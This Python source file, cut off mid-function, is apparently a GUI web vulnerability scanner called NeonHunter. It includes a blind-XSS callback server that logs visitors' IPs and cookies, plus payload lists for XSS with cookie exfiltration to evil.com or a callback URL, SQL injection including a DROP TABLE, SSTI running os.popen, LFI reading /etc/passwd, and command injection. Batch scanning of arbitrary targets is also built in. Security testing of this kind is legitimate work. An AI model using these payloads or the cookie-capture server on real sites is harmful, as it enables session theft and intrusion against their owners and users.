import tkinter as tk
from tkinter import ttk, scrolledtext, filedialog, messagebox, simpledialog
import requests
from urllib.parse import urlparse, parse_qs, urlencode, quote
from bs4 import BeautifulSoup
import threading
import time
import os
import json
import csv
from datetime import datetime
import queue as pyqueue
from http.server import HTTPServer, BaseHTTPRequestHandler
import socket
import webbrowser
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service as ChromeService
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By
from itertools import cycle
import winsound
import base64
import re
import ipaddress
import random
import string
import hashlib
from concurrent.futures import ThreadPoolExecutor, as_completed
import uuid
import html as html_module
import traceback
import math

app = None

class BlindCallbackHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        
        client_ip = self.client_address[0]
        user_agent = self.headers.get('User-Agent', 'Unknown')
        referer = self.headers.get('Referer', 'None')
        cookies = self.headers.get('Cookie', 'None')
        
        html_content = f"""
        <html>
        <head>
            <title>NeonHunter Blind XSS Detected</title>
            <style>
                body {{ 
                    background: linear-gradient(135deg, #000000 0%, #110033 100%);
                    color: #00ffff;
                    font-family: 'Segoe UI', monospace;
                    margin: 0;
                    padding: 40px;
                }}
                .container {{
                    max-width: 800px;
                    margin: 0 auto;
                    background: rgba(0, 0, 0, 0.7);
                    padding: 40px;
                    border-radius: 20px;
                    border: 3px solid #ff00ff;
                    box-shadow: 0 0 50px rgba(255, 0, 255, 0.5);
                    position: relative;
                    overflow: hidden;
                }}
                .container::before {{
                    content: '';
                    position: absolute;
                    top: 0;
                    left: 0;
                    right: 0;
                    height: 5px;
                    background: linear-gradient(90deg, #ff00ff, #00ffff, #ff00ff);
                    animation: neonBorder 2s linear infinite;
                }}
                @keyframes neonBorder {{
                    0% {{ background-position: 0% 50%; }}
                    100% {{ background-position: 200% 50%; }}
                }}
                h1 {{
                    color: #ff00ff;
                    text-shadow: 0 0 10px #ff00ff, 0 0 20px #ff00ff;
                    font-size: 2.5em;
                    text-align: center;
                    margin-bottom: 30px;
                    animation: pulse 1.5s infinite alternate;
                }}
                @keyframes pulse {{
                    from {{ opacity: 0.8; }}
                    to {{ opacity: 1; }}
                }}
                .info {{
                    background: rgba(0, 255, 255, 0.1);
                    border-left: 5px solid #00ffff;
                    padding: 20px;
                    margin: 20px 0;
                    border-radius: 10px;
                    transition: transform 0.3s;
                }}
                .info:hover {{
                    transform: translateX(10px);
                    background: rgba(0, 255, 255, 0.2);
                }}
                .glow-text {{
                    color: #00ff88;
                    text-shadow: 0 0 10px #00ff88;
                    font-weight: bold;
                }}
                .data {{
                    background: rgba(255, 0, 255, 0.1);
                    padding: 15px;
                    border-radius: 10px;
                    margin: 10px 0;
                    font-family: monospace;
                    word-break: break-all;
                }}
            </style>
        </head>
        <body>
            <div class="container">
                <h1>⚡ BLIND XSS PAYLOAD TRIGGERED! ⚡</h1>
                <div class="info">
                    <p>Your session has been captured by <span class="glow-text">NEONHUNTER</span>.</p>
                    <p>This is a security test notification.</p>
                </div>
                <h3>📊 CAPTURED DATA:</h3>
                <div class="data">
                    <p><strong>IP:</strong> {html_module.escape(client_ip)}</p>
                    <p><strong>User-Agent:</strong> {html_module.escape(user_agent)}</p>
                    <p><strong>Referer:</strong> {html_module.escape(referer)}</p>
                    <p><strong>Cookies:</strong> {html_module.escape(cookies)}</p>
                    <p><strong>Path:</strong> {html_module.escape(self.path)}</p>
                </div>
            </div>
        </body>
        </html>
        """
        
        self.wfile.write(html_content.encode('utf-8'))
        
        if app:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            log_entry = f"""
[BLIND XSS CALLBACK] {timestamp}
├── IP: {client_ip}
├── User-Agent: {user_agent}
├── Referer: {referer}
├── Cookies: {cookies}
└── Path: {self.path}
"""
            app.log(log_entry)
            app.log_live_request('CALLBACK', f"Blind XSS from {client_ip}", 200)
            
            blind_log = {
                'timestamp': timestamp,
                'client_ip': client_ip,
                'user_agent': user_agent,
                'referer': referer,
                'cookies': cookies,
                'path': self.path
            }
            app.save_blind_xss_log(blind_log)

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b"POST received")
        
        if app:
            client_ip = self.client_address[0]
            app.log(f"[!!!] POST CALLBACK from {client_ip} - Data: {post_data[:100]}...")
            app.log_live_request('POST-CALLBACK', f"POST from {client_ip}", 200)

    def log_message(self, format, *args):
        return

class AdvancedNeonToggle(tk.Canvas):
    def __init__(self, master, variable, command=None, toggle_width=80, toggle_height=36, **kwargs):
        kwargs.pop('width', None)
        kwargs.pop('height', None)
        
        super().__init__(master, width=toggle_width, height=toggle_height, 
                         highlightthickness=0, bg='#000000', **kwargs)
        self.var = variable
        self.command = command
        self.state = variable.get()
        
        self.off_bg = "#220044"
        self.on_bg = "#00ff88"
        self.knob_color = "#ffffff"
        self.glow_color = "#00ffff"
        self.border_color = "#ff00ff"
        self.text_color = "#ffffff"
        
        self.bind("<Button-1>", self.toggle)
        self.bind("<B1-Motion>", self.toggle)
        variable.trace_add("write", self._on_var_changed)
        self._draw()
        
        # Hover effect
        self.bind("<Enter>", self._on_enter)
        self.bind("<Leave>", self._on_leave)
        
    def _draw(self):
        self.delete("all")
        state = self.var.get()
        bg_color = self.on_bg if state else self.off_bg
        text = "ON" if state else "OFF"
        
        # Background with gradient effect
        self.create_rectangle(2, 2, 78, 34, fill=bg_color, outline=self.border_color, width=3)
        
        # Neon glow effect
        x = 55 if state else 25
        for i in range(3, 0, -1):
            glow_opacity = i/10
            self.create_oval(x-10-i, 5-i, x+10+i, 25+i, 
                           outline=self.glow_color, width=1, 
                           fill='' if i==3 else self.knob_color)
        
        # Text with shadow
        self.create_text(41, 20, text=text, fill="#000000", 
                        font=('Consolas', 10, 'bold'))
        self.create_text(40, 18, text=text, fill=self.text_color, 
                        font=('Consolas', 10, 'bold'))
        
    def toggle(self, event=None):
        self.var.set(not self.var.get())
        self._draw()
        if self.command:
            self.command()
        if app:
            app.play_click_sound()
            
    def _on_var_changed(self, *args):
        self._draw()
        
    def _on_enter(self, event):
        self.config(cursor="hand2")
        
    def _on_leave(self, event):
        self.config(cursor="")

class SessionManager:
    def __init__(self):
        self.sessions = {}
        self.current_session = "default"
        
    def create_session(self, name, headers=None, cookies=None, proxies=None):
        session = requests.Session()
        if headers:
            session.headers.update(headers)
        if cookies:
            session.cookies.update(cookies)
        if proxies:
            session.proxies.update(proxies)
        self.sessions[name] = session
        return session
    
    def get_session(self, name="default"):
        return self.sessions.get(name, requests.Session())

class AdvancedPayloadGenerator:
    @staticmethod
    def generate_xss_payloads(callback_url=None):
        payloads = [
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '<body onload=alert(1)>',
            '\'"--></style></scRipt><scRipt>alert(1)</scRipt>',
            '<iframe src="javascript:alert(`xss`)">',
            '<script>document.location="http://evil.com?c="+document.cookie</script>',
            '&#x3C;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x3C;&#x2F;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;',
        ]
        
        if callback_url:
            payloads.extend([
                f'<script>fetch("{callback_url}?cookie="+document.cookie)</script>',
                f'<img src=x onerror="fetch(\'{callback_url}?data=\'+btoa(document.cookie))">',
            ])
        
        return payloads
    
    @staticmethod
    def generate_sqli_payloads():
        return [
            "' OR '1'='1",
            "' UNION SELECT NULL,NULL--",
            "'; DROP TABLE users--",
            "' OR SLEEP(5)--",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "' OR 1=1--",
            "' AND 1=0 UNION SELECT 1,2,3--",
            "' AND ExtractValue(0,CONCAT(0x3a,USER()))--",
        ]
    
    @staticmethod
    def generate_ssti_payloads():
        return [
            '{{7*7}}',
            '${7*7}',
            '<%=7*7%>',
            '{{config}}',
            '{{settings.SECRET_KEY}}',
            '{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__.__import__("os").popen("id").read()}}{% endif %}{% endfor %}',
        ]
    
    @staticmethod
    def generate_open_redirect_payloads():
        return [
            'https://google.com',
            '//evil.com',
            'javascript:alert(1)',
            '/\\evil.com',
            'http://%65%76%69%6C%2E%63%6F%6D',
            '%0D%0A%0D%0Ahttps://google.com',
        ]
    
    @staticmethod
    def generate_hpp_payloads():
        return [
            'id=1&id=admin',
            'user=guest&user=admin',
            'role=user&role[]=admin',
            'param=value&param=overwrite',
        ]
    
    @staticmethod
    def generate_lfi_payloads():
        return [
            '../../../../etc/passwd',
            '....//....//....//etc/passwd',
            '..%2F..%2F..%2Fetc%2Fpasswd',
            '/proc/self/environ',
            'file:///etc/passwd',
            'C:\\Windows\\System32\\drivers\\etc\\hosts',
        ]
    
    @staticmethod
    def generate_command_injection_payloads():
        return [
            '; id',
            '| whoami',
            '`cat /etc/passwd`',
            '$(ls -la)',
            '|| ping -c 10 127.0.0.1',
            '&& cat /etc/passwd',
        ]
    
    @staticmethod
    def generate_custom_payload_from_text(text):
        """Generate payloads from custom text input"""
        payloads = []
        lines = text.strip().split('\n')
        for line in lines:
            line = line.strip()
            if line and not line.startswith('#'):
                payloads.append(line)
        return payloads

class BatchProcessor:
    def __init__(self, app):
        self.app = app
        self.targets = []
        self.current_target_index = 0
        self.batch_results = []
        self.is_batch_running = False
        
    def load_targets_from_file(self, filepath):
        """Load multiple targets from a file"""
        try:
            with open(filepath, 'r') as f:
                targets = [line.strip() for line in f if line.strip()]
            
            self.targets = []
            for target in targets:
                if target and not target.startswith('#'):
                    if not target.startswith(('http://', 'https://')):
                        target = 'http://' + target
                    self.targets.append(target)
            
            return len(self.targets)
        except Exception as e:
            self.app.log(f"Error loading targets: {e}")
            return 0
        
    def load_targets_from_file_gui(self):
        """Load multiple targets from file using GUI dialog"""
        try:
            filepath = filedialog.askopenfilename(
                title="Select targets file",
                filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
            )
            
            if not filepath:
                return 0
                
            count = self.load_targets_from_file(filepath)
            if count > 0:
                self.app.log(f"📂 Loaded {count} targets from {os.path.basename(filepath)}")
                messagebox.showinfo("Targets Loaded", 
                                  f"Successfully loaded {count} targets.\n\nClick 'Batch Scan' to start scanning all targets.")
            else:
                messagebox.showwarning("No Targets", "No valid targets found in file.")
                
            return count
        except Exception as e:
            self.app.log(f"❌ Error loading targets: {e}")
            messagebox.showerror("Error", f"Failed to load targets:\n{e}")
            return 0
    
    def start_batch_scan(self):
        """Start scanning multiple targets"""
        if not self.targets:
            messagebox.showwarning("No Targets", "Load targets first!")
            return
        
        self.is_batch_running = True
        self.current_target_index = 0
        self.batch_results = []
        
        self.app.log(f"Starting batch scan with {len(self.targets)} targets")
        self.scan_next_target()
    
    def scan_next_target(self):
        """Scan the next target in the list"""
        if not self.is_batch_running or self.current_target_index >= len(self.targets):
            self.batch_complete()
            return
        
        target = self.targets[self.current_target_index]
        self.app.log(f"Batch ({self.current_target_index + 1}/{len(self.targets)}): {target}")
        
        self.app.target_entry.delete(0, tk.END)
        self.app.target_entry.insert(0, target)
        
        self.app.start_direct_fuzz()
        
        self.monitor_scan_completion()
    
    def monitor_scan_completion(self):
        """Monitor when current scan completes"""
        if not self.app.is_running and self.is_batch_running:
            target_results = {
                'target': self.targets[self.current_target_index],
                'findings': len(self.app.results),
                'critical': sum(1 for r in self.app.results if r.get('severity') == 'Critical'),
                'timestamp': datetime.now().isoformat()
            }
            self.batch_results.append(target_results)
            
            self.current_target_index += 1
            
            time.sleep(2)
            self.scan_next_target()
        else:
            self.app.root.after(1000, self.monitor_scan_completion)
    
    def batch_complete(self):
        """Handle batch scan completion"""
        self.is_batch_running = False
        total_findings = sum(r['findings'] for r in self.batch_results)
        total_critical = sum(r['critical'] for r in self.batch_results)
        
        self.app.log(f"BATCH SCAN COMPLETE")
        self.app.log(f"Total targets: {len(self.targets)}")
        self.app.log(f"Total findings: {total_findings}")
        self.app.log(f"Critical findings: {total_critical}")
        
        self.generate_batch_report()
    
    def generate_batch_report(self):
        """Generate comprehensive batch report"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        report_path = f"NEONHUNTER_BATCH_REPORT_{timestamp}.html"
        
        html_content = self.create_batch_report_html()
        
        with open(report_path, 'w', encoding='utf-8') as f:
            f.write(html_content)
        
        self.app.log(f"Batch report generated: {report_path}")
        
        messagebox.showinfo("Batch Complete",
                          f"Batch scan completed!\n\n"
                          f"Targets: {len(self.targets)}\n"
                          f"Findings: {sum(r['findings'] for r in self.batch_results)}\n"
                          f"Report: {report_path}")
    
    def create_batch_report_html(self):
        """Create HTML batch report"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        html = f"""<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>NEONHUNTER - Batch Scan Report</title>
    <style>
        :root {{
            --primary: #00ffff;
            --secondary: #ff00ff;
            --accent: #00ff88;
            --dark: #000;
            --darker: #110033;
            --darkest: #000011;
        }}
        
        body {{
            background: var(--dark);
            color: var(--accent);
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            margin: 0;
            padding: 0;
            line-height: 1.6;
        }}
        
        .container {{
            max-width: 1400px;
            margin: 0 auto;
            padding: 40px;
        }}
        
        .header {{
            text-align: center;
            padding: 40px 0;
            background: linear-gradient(135deg, var(--darker) 0%, #220066 100%);
            border-radius: 20px;
            margin-bottom: 40px;
            border: 3px solid var(--primary);
            box-shadow: 0 0 30px var(--primary);
            position: relative;
            overflow: hidden;
        }}
        
        .header::before {{
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: radial-gradient(circle, transparent 30%, var(--primary) 70%);
            opacity: 0.1;
            animation: rotate 20s linear infinite;
        }}
        
        @keyframes rotate {{
            0% {{ transform: rotate(0deg); }}
            100% {{ transform: rotate(360deg); }}
        }}
        
        h1 {{
            color: var(--primary);
            font-size: 3.5em;
            margin: 0;
            text-shadow: 0 0 20px var(--primary);
            position: relative;
            z-index: 2;
        }}
        
        h2 {{
            color: var(--secondary);
            font-size: 2.2em;
            margin: 20px 0;
            border-left: 5px solid var(--accent);
            padding-left: 15px;
            position: relative;
            z-index: 2;
        }}
        
        .subtitle {{
            color: var(--accent);
            font-size: 1.2em;
            opacity: 0.9;
            position: relative;
            z-index: 2;
        }}
        
        .summary-grid {{
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 25px;
            margin: 40px 0;
        }}
        
        .stat-card {{
            background: linear-gradient(145deg, var(--darker), #220044);
            border: 2px solid var(--primary);
            border-radius: 15px;
            padding: 25px;
            text-align: center;
            transition: transform 0.3s, box-shadow 0.3s;
            position: relative;
            overflow: hidden;
        }}
        
        .stat-card:hover {{
            transform: translateY(-5px);
            box-shadow: 0 10px 25px rgba(0, 255, 255, 0.3);
        }}
        
        .stat-card::before {{
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 4px;
            background: linear-gradient(90deg, var(--primary), var(--secondary));
        }}
        
        .stat-number {{
            font-size: 2.8em;
            font-weight: bold;
            color: var(--primary);
            margin: 10px 0;
        }}
        
        .stat-label {{
            color: var(--accent);
            font-size: 1.1em;
            opacity: 0.9;
        }}
        
        .table-container {{
            background: var(--darker);
            border-radius: 15px;
            padding: 25px;
            margin: 40px 0;
            border: 2px solid var(--secondary);
            overflow-x: auto;
        }}
        
        table {{
            width: 100%;
            border-collapse: separate;
            border-spacing: 0;
        }}
        
        th {{
            background: linear-gradient(135deg, var(--secondary), #cc00ff);
            color: white;
            padding: 18px;
            text-align: left;
            font-size: 1.1em;
            position: sticky;
            top: 0;
        }}
        
        td {{
            padding: 15px;
            border-bottom: 1px solid rgba(0, 255, 255, 0.1);
            transition: background 0.3s;
        }}
        
        tr:hover td {{
            background: rgba(0, 255, 255, 0.05);
        }}
        
        .critical {{
            color: #ff0000;
            font-weight: bold;
            animation: pulse 1.5s infinite;
        }}
        
        @keyframes pulse {{
            0%, 100% {{ opacity: 1; }}
            50% {{ opacity: 0.7; }}
        }}
        
        .high {{ color: #ff6600; }}
        .medium {{ color: #ffff00; }}
        .low {{ color: #00ff00; }}
        
        .recommendations {{
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 20px;
            margin: 40px 0;
        }}
        
        .recommendation-card {{
            background: linear-gradient(145deg, #001100, #003300);
            border: 2px solid var(--accent);
            border-radius: 15px;
            padding: 25px;
            position: relative;
            overflow: hidden;
        }}
        
        .footer {{
            text-align: center;
            margin-top: 60px;
            padding-top: 40px;
            border-top: 3px solid var(--secondary);
            color: var(--accent);
            font-size: 1.1em;
        }}
        
        .neon-text {{
            color: var(--primary);
            text-shadow: 0 0 10px var(--primary);
            font-weight: bold;
        }}
        
        .glow {{
            animation: glow 2s ease-in-out infinite alternate;
        }}
        
        @keyframes glow {{
            from {{ text-shadow: 0 0 10px var(--primary); }}
            to {{ text-shadow: 0 0 20px var(--primary), 0 0 30px var(--secondary); }}
        }}
        
        .watermark {{
            position: fixed;
            bottom: 20px;
            right: 20px;
            opacity: 0.1;
            font-size: 10em;
            color: var(--primary);
            pointer-events: none;
        }}
        
        .severity-badge {{
            display: inline-block;
            padding: 5px 15px;
            border-radius: 20px;
            font-weight: bold;
            font-size: 0.9em;
            margin: 2px;
        }}
        
        .severity-critical {{ background: rgba(255, 0, 0, 0.2); color: #ff0000; border: 1px solid #ff0000; }}
        .severity-high {{ background: rgba(255, 102, 0, 0.2); color: #ff6600; border: 1px solid #ff6600; }}
        .severity-medium {{ background: rgba(255, 255, 0, 0.2); color: #ffff00; border: 1px solid #ffff00; }}
        .severity-low {{ background: rgba(0, 255, 0, 0.2); color: #00ff00; border: 1px solid #00ff00; }}
        
        .scan-metrics {{
            background: linear-gradient(135deg, #000033, #330033);
            border-radius: 15px;
            padding: 30px;
            margin: 30px 0;
            border: 2px solid var(--primary);
        }}
        
        .metric-item {{
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 15px 0;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
        }}
        
        .metric-item:last-child {{
            border-bottom: none;
        }}
        
        .metric-value {{
            font-size: 1.3em;
            color: var(--primary);
            font-weight: bold;
        }}
    </style>
</head>
<body>
    <div class="watermark">NEONHUNTER</div>
    
    <div class="container">
        <div class="header">
            <h1 class="glow">NEONHUNTER PRO</h1>
            <h2>Advanced Batch Security Assessment Report</h2>
            <div class="subtitle">
                <p>Professional Web Vulnerability Scanner | Version 3.5</p>
                <p>Generated: {timestamp}</p>
            </div>
        </div>
        
        <div class="scan-metrics">
            <h2>SCAN METRICS OVERVIEW</h2>
            <div class="metric-item">
                <span>Total Targets Scanned:</span>
                <span class="metric-value">{len(self.targets)}</span>
            </div>
            <div class="metric-item">
                <span>Total Findings Identified:</span>
                <span class="metric-value">{sum(r['findings'] for r in self.batch_results)}</span>
            </div>
            <div class="metric-item">
                <span>Critical Vulnerabilities:</span>
                <span class="metric-value">{sum(r['critical'] for r in self.batch_results)}</span>
            </div>
            <div class="metric-item">
                <span>Scan Success Rate:</span>
                <span class="metric-value">{round((len([r for r in self.batch_results if r['findings'] > 0]) / len(self.targets) * 100) if self.targets else 0, 1)}%</span>
            </div>
        </div>
        
        <div class="summary-grid">
            <div class="stat-card">
                <div class="stat-number">{len(self.targets)}</div>
                <div class="stat-label">Targets Scanned</div>
            </div>
            
            <div class="stat-card">
                <div class="stat-number">{sum(r['findings'] for r in self.batch_results)}</div>
                <div class="stat-label">Total Findings</div>
            </div>
            
            <div class="stat-card">
                <div class="stat-number">{sum(r['critical'] for r in self.batch_results)}</div>
                <div class="stat-label">Critical Issues</div>
            </div>
            
            <div class="stat-card">
                <div class="stat-number">
                    {round(sum(r['findings'] for r in self.batch_results) / len(self.targets), 1) if self.targets else 0}
                </div>
                <div class="stat-label">Avg Findings per Target</div>
            </div>
        </div>
        
        <h2>TARGETS SCAN RESULTS</h2>
        <div class="table-container">
            <table>
                <thead>
                    <tr>
                        <th>#</th>
                        <th>Target URL</th>
                        <th>Findings</th>
                        <th>Critical</th>
                        <th>Status</th>
                        <th>Security Score</th>
                    </tr>
                </thead>
                <tbody>
"""
        
        for i, result in enumerate(self.batch_results, 1):
            status = "Secure" if result['findings'] == 0 else "Vulnerable" if result['critical'] == 0 else "Critical"
            score = 100 - min(100, result['findings'] * 10 + result['critical'] * 30)
            
            html += f"""
                    <tr>
                        <td>{i}</td>
                        <td><span class="neon-text">{html_module.escape(result['target'][:60])}</span>{'...' if len(result['target']) > 60 else ''}</td>
                        <td><span class="{'critical' if result['findings'] > 5 else 'high' if result['findings'] > 2 else 'medium'}">{result['findings']}</span></td>
                        <td><span class="critical">{result['critical']}</span></td>
                        <td>
                            <span class="severity-badge severity-{'critical' if status == 'Critical' else 'high' if status == 'Vulnerable' else 'low'}">
                                {status}
                            </span>
                        </td>
                        <td>
                            <div style="background: rgba(255,255,255,0.1); border-radius: 10px; height: 20px; margin: 5px 0;">
                                <div style="background: {'#00ff00' if score > 80 else '#ffff00' if score > 60 else '#ff6600' if score > 40 else '#ff0000'}; 
                                     width: {score}%; height: 100%; border-radius: 10px; transition: width 1s;">
                                </div>
                            </div>
                            <span class="{'critical' if score < 40 else 'high' if score < 60 else 'medium' if score < 80 else 'low'}">
                                {score}/100
                            </span>
                        </td>
                    </tr>
"""
        
        html += """
                </tbody>
            </table>
        </div>
        
        <h2>SECURITY RECOMMENDATIONS</h2>
        <div class="recommendations">
            <div class="recommendation-card">
                <h3>Immediate Actions</h3>
                <ul>
                    <li>Patch all critical vulnerabilities within 24 hours</li>
                    <li>Implement Web Application Firewall (WAF)</li>
                    <li>Review authentication mechanisms</li>
                    <li>Update all third-party dependencies</li>
                </ul>
            </div>
            
            <div class="recommendation-card">
                <h3>Short-term Improvements</h3>
                <ul>
                    <li>Implement proper input validation</li>
                    <li>Add security headers (CSP, HSTS)</li>
                    <li>Regular security scanning</li>
                    <li>Develop incident response plan</li>
                </ul>
            </div>
            
            <div class="recommendation-card">
                <h3>Long-term Strategy</h3>
                <ul>
                    <li>Establish security training program</li>
                    <li>Implement DevSecOps pipeline</li>
                    <li>Regular penetration testing</li>
                    <li>Bug bounty program</li>
                </ul>
            </div>
        </div>
        
        <div class="footer">
            <p class="neon-text">NEONHUNTER v3.5 - Elite Security Scanner</p>
            <p>Developed by <strong>Dickson Godwin Massawe</strong></p>
            <p>GitHub: <a href="https://github.com/dkhacker707" style="color: var(--primary);">dkhacker707</a></p>
            <p>For security consultations and custom integrations</p>
            <p>© {datetime.now().strftime('%Y')} NeonHunter | Hunt Ethically, Stay Secure</p>
        </div>
    </div>
</body>
</html>
"""
        return html

class NeonIconButton(tk.Button):
    def __init__(self, master, text="", icon=None, command=None, color_scheme="primary", **kwargs):
        super().__init__(master, **kwargs)
        
        display_text = f"{icon} {text}" if icon else text
        
        # Color schemes
        schemes = {
            "primary": {"bg": "#220044", "fg": "#00ffff", "hover_bg": "#00ffff", "hover_fg": "#000000"},
            "secondary": {"bg": "#330033", "fg": "#ff00ff", "hover_bg": "#ff00ff", "hover_fg": "#000000"},
            "accent": {"bg": "#003322", "fg": "#00ff88", "hover_bg": "#00ff88", "hover_fg": "#000000"},
            "danger": {"bg": "#440000", "fg": "#ff4444", "hover_bg": "#ff4444", "hover_fg": "#000000"},
            "warning": {"bg": "#443300", "fg": "#ffff00", "hover_bg": "#ffff00", "hover_fg": "#000000"},
        }
        
        scheme = schemes.get(color_scheme, schemes["primary"])
        
        self.config(
            text=display_text,
            command=command,
            bg=scheme['bg'],
            fg=scheme['fg'],
            font=('Consolas', 10, 'bold'),
            relief='raised',
            bd=2,
            padx=15,
            pady=8,
            cursor='hand2',
            activebackground=scheme['hover_bg'],
            activeforeground=scheme['hover_fg'],
            compound='left'
        )
        
        # Store hover colors
        self.hover_bg = scheme['hover_bg']
        self.hover_fg = scheme['hover_fg']
        self.normal_bg = scheme['bg']
        self.normal_fg = scheme['fg']
        
        self.bind('<Enter>', self.on_enter)
        self.bind('<Leave>', self.on_leave)
        
        # Add click animation
        self.bind('<Button-1>', self.on_click)
        
    def on_enter(self, e):
        self.config(bg=self.hover_bg, fg=self.hover_fg)
        
    def on_leave(self, e):
        self.config(bg=self.normal_bg, fg=self.normal_fg)
        
    def on_click(self, e):
        self.flash_animation()
        if app:
            app.play_click_sound()
            
    def flash_animation(self):
        original_bg = self.cget('bg')
        self.config(bg='#ffffff')
        self.after(100, lambda: self.config(bg=original_bg))

class DashboardWindow:
    def __init__(self, parent):
        self.parent = parent
        self.window = tk.Toplevel(parent)
        self.window.title("📊 NEONHUNTER DASHBOARD")
        self.window.configure(bg='#000000')
        self.window.geometry("1400x800+100+100")
        
        self.setup_ui()
        self.animate_ui()
        
    def setup_ui(self):
        # Main container with cyberpunk grid
        main_frame = tk.Frame(self.window, bg='#000000')
        main_frame.pack(fill='both', expand=True, padx=10, pady=10)
        
        # Animated border
        self.canvas = tk.Canvas(main_frame, bg='#000000', highlightthickness=0)
        self.canvas.place(relwidth=1, relheight=1)
        
        # Title
        title_frame = tk.Frame(main_frame, bg='#000000')
        title_frame.pack(fill='x', pady=(0, 20))
        
        tk.Label(title_frame, text="⚡ REAL-TIME DASHBOARD", 
                font=('Consolas', 28, 'bold'), 
                fg='#00ffff', bg='#000000').pack()
        
        tk.Label(title_frame, text="Live Monitoring & Analytics", 
                font=('Consolas', 14), 
                fg='#ff00ff', bg='#000000').pack()
        
        # Stats grid
        stats_frame = tk.Frame(main_frame, bg='#000000')
        stats_frame.pack(fill='both', expand=True)
        
        # Row 1: Performance metrics
        perf_frame = tk.LabelFrame(stats_frame, text="⚡ PERFORMANCE", 
                                  font=('Consolas', 14, 'bold'),
                                  fg='#00ffff', bg='#000000',
                                  labelanchor='n')
        perf_frame.grid(row=0, column=0, padx=10, pady=10, sticky='nsew')
        
        metrics = [
            ("🚀 Requests/Sec", "0", "#00ffff"),
            ("⏱️ Response Time", "0ms", "#00ff88"),
            ("📊 Success Rate", "100%", "#00ff88"),
            ("⚠️ Error Rate", "0%", "#ff4444"),
        ]
        
        for i, (label, value, color) in enumerate(metrics):
            frame = tk.Frame(perf_frame, bg='#000000')
            frame.pack(fill='x', padx=20, pady=10)
            
            tk.Label(frame, text=label, fg='#ffffff', bg='#000000',
                    font=('Consolas', 12)).pack(side='left')
            
            val_label = tk.Label(frame, text=value, fg=color, bg='#000000',
                               font=('Consolas', 12, 'bold'))
            val_label.pack(side='right')
            
            # Store reference for updates
            label_key = label.split()[0].replace("🚀", "requests").replace("⏱️", "response").replace("📊", "success").replace("⚠️", "error").lower()
            setattr(self, f"perf_{label_key}", val_label)
        
        # Row 1: Vulnerability stats
        vuln_frame = tk.LabelFrame(stats_frame, text="🔍 VULNERABILITIES", 
                                  font=('Consolas', 14, 'bold'),
                                  fg='#ff00ff', bg='#000000',
                                  labelanchor='n')
        vuln_frame.grid(row=0, column=1, padx=10, pady=10, sticky='nsew')
        
        vulns = [
            ("⚡ CRITICAL", "0", "#ff0000"),
            ("⚠️ HIGH", "0", "#ff6600"),
            ("🔶 MEDIUM", "0", "#ffff00"),
            ("✅ LOW", "0", "#00ff00"),
        ]
        
        for i, (label, value, color) in enumerate(vulns):
            frame = tk.Frame(vuln_frame, bg='#000000')
            frame.pack(fill='x', padx=20, pady=10)
            
            tk.Label(frame, text=label, fg=color, bg='#000000',
                    font=('Consolas', 12, 'bold')).pack(side='left')
            
            val_label = tk.Label(frame, text=value, fg=color, bg='#000000',
                               font=('Consolas', 12, 'bold'))
            val_label.pack(side='right')
            
            label_key = label.split()[0].replace("⚡", "critical").replace("⚠️", "high").replace("🔶", "medium").replace("✅", "low").lower()
            setattr(self, f"vuln_{label_key}", val_label)
        
        # Row 2: Network stats
        net_frame = tk.LabelFrame(stats_frame, text="🌐 NETWORK", 
                                 font=('Consolas', 14, 'bold'),
                                 fg='#00ff88', bg='#000000',
                                 labelanchor='n')
        net_frame.grid(row=1, column=0, padx=10, pady=10, sticky='nsew')
        
        network = [
            ("📡 Total Requests", "0", "#00ffff"),
            ("📥 Data Sent", "0 KB", "#ff00ff"),
            ("📤 Data Received", "0 KB", "#00ff88"),
            ("🔌 Active Threads", "0", "#ffff00"),
        ]
        
        for i, (label, value, color) in enumerate(network):
            frame = tk.Frame(net_frame, bg='#000000')
            frame.pack(fill='x', padx=20, pady=10)
            
            tk.Label(frame, text=label, fg='#ffffff', bg='#000000',
                    font=('Consolas', 12)).pack(side='left')
            
            val_label = tk.Label(frame, text=value, fg=color, bg='#000000',
                               font=('Consolas', 12, 'bold'))
            val_label.pack(side='right')
            
            label_key = label.split()[0].replace("📡", "total").replace("📥", "sent").replace("📤", "received").replace("🔌", "threads").lower()
            setattr(self, f"net_{label_key}", val_label)
        
        # Row 2: Targets
        target_frame = tk.LabelFrame(stats_frame, text="🎯 TARGETS", 
                                    font=('Consolas', 14, 'bold'),
                                    fg='#ffff00', bg='#000000',
                                    labelanchor='n')
        target_frame.grid(row=1, column=1, padx=10, pady=10, sticky='nsew')
        
        targets = [
            ("🎯 Current Target", "-", "#00ffff"),
            ("📁 Batch Progress", "0/0", "#ff00ff"),
            ("⏱️ Scan Duration", "0s", "#00ff88"),
            ("🔜 Estimated Time", "-", "#ffff00"),
        ]
        
